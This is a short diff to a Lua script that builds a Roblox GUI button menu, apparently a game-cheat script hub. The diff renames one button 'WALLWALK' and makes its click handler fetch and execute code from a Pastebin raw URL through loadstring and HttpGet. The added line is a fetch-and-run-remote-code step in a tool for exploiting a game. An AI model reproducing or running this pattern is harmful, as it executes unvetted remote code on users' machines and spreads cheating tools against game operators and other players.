@@ -760,7 +760,7 @@ TextButton_56.BorderColor3 = Color3.fromRGB(20, 20, 20)
 TextButton_56.Position = UDim2.new(0.681122363, 0, 0.279850751, 0)
 TextButton_56.Size = UDim2.new(0, 97, 0, 61)
 TextButton_56.Font = Enum.Font.GothamBlack
-TextButton_56.Text = "e"
+TextButton_56.Text = "WALLWALK"
 TextButton_56.TextColor3 = Color3.fromRGB(0, 8, 179)
 TextButton_56.TextSize = 15.000
 
@@ -2233,7 +2233,7 @@ end)
 
 
 TextButton_56.MouseButton1Down:connect(function()
-
+loadstring(game:HttpGet("https://pastebin.com/raw/RY9cBbdG",true))()
 end)
 
 TextButton_57.MouseButton1Down:connect(function()
